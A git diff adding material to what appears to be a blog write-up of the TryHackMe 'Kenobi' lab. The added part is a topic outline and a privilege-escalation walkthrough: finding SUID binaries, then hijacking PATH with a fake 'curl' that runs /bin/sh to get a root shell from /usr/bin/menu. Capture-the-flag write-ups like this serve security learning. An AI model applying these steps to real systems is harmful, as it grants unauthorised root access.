@@ -10,6 +10,18 @@ categories: ['linux', 'security', 'thm']
 
 [TryHackMe ~ Kenobi](https://tryhackme.com/room/kenobi)
 
+Includes:
+- Recon
+  - nmap
+  - samba enumeration
+  - nfs scans
+- Exploit
+  - netcat
+  - searchsploit
+- Privilege esculation
+  - SUID binaries
+  - PATH poisoning
+
 ### Recon
 
 #### Nmap 
@@ -172,8 +184,28 @@ and we are in!
 find / -perm -u=s -type f 2>/dev/null
 
 ```
-/usr/bin/menu
-This is a menu application with afew options of commands to run 
+This find typical binaries and files like ping, sudo etc and `/usr/bin/menu`
+
+#### Exploiting this
+
+Running `/usr/bin/menu` brings up 3 options that just look like preconfigured system commands.
+```
+strings /usr/bin/menu
+
+curl -I localhost
+uname -r
+ifconfig
+```
+These are the commands that are being used and would be run as root, they don't specify a full path so we can exploit these using the PATH variable to redirect the issued command to our own binary that will be run as root.
+
+```
+cd /tmp
+echo /bin/sh > curl
+chmod 777 curl
+PATH=/tmp:$PATH; /usr/bin/menu
+```
+Run the curl command via the menu binary and `#`, root shell!
+
 
 
 
